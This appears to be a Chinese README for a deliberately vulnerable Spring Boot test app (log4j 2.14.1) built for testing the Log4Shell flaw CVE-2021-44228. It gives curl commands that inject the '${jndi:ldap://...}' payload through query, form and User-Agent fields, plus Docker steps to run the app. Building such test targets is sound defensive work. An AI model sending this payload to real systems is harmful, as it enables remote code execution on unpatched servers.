# Log4j 2 CVE-2021-44228 测试样本应用

基于 spring-boot-starter-log4j2:2.6.1 (log4j 2.14.1)

## 可用接口

| 接口 | 请求方法 | 参数 |
|-----|-----|-----|
| `vulnerable_request_get` | GET | v=payload |
| `vulnerable_request_post` | POST | v=payload |
| `vulnerable_request_header_ua` | GET / POST | Header `User-Agent` |

## 测试可用

* GET
```shell
$ curl 'http://[targetIP]:8080/vulnerable_request_get?v=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%2Ffake%7D'
{"method":"vulnerable_request_get","payload":"${jndi:ldap://127.0.0.1/fake}"}
```

* POST
```shell
$ curl -X POST -F 'v=${jndi:ldap://127.0.0.1/fake}' 'http://[targetIP]:8080/vulnerable_request_post'
{"method":"vulnerable_request_post","payload":"${jndi:ldap://127.0.0.1/fake}"}
```
* UserAgent
```shell
$ curl 'http://[targetIP]:8080/vulnerable_request_header_ua' --user-agent '${jndi:ldap://127.0.0.1/fake}'
{"method":"vulnerable_request_header_ua","payload":"${jndi:ldap://127.0.0.1/fake}"}
```

## 快速启动
```shell
docker run -p 8080:8080 ghcr.io/zzzz0317/log4j2-vulnerable-spring-app:latest
```
注：当前镜像基于 [openjdk:8u111-jdk](https://hub.docker.com/layers/openjdk/library/openjdk/8u111-jdk/images/sha256-c1ff613e8ba25833d2e1940da0940c3824f03f802c449f3d1815a66b7f8c0e9d?context=explore)
## 构建镜像
```shell
docker build -t log4j2-vulnerable-spring-app:latest .
docker run -p 8080:8080 log4j2-vulnerable-spring-app:latest
```
